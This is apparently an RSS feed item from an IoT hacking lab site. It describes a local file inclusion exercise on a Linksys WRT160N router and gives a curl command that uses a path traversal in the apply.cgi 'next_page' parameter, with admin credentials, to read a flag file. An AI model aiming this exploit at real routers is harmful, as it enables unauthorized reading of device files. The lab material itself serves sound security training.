channel.title: WRT160N on IoT Hack Labs
channel.description: Recent content in WRT160N on IoT Hack Labs

item.title: Local File Inclusion
item.description: Local File Inclusion Run the following command to retrieve the flag: curl --user 'admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT' -X POST -d "submit_type=wsc_method2&change_action=gozila_cgi&next_page=../../tmp/flag.txt" http://172.21.0.15:8080/apply.cgi The next_page parameter in the request specifies the file we want to read. The content of the file will be returned in the response.
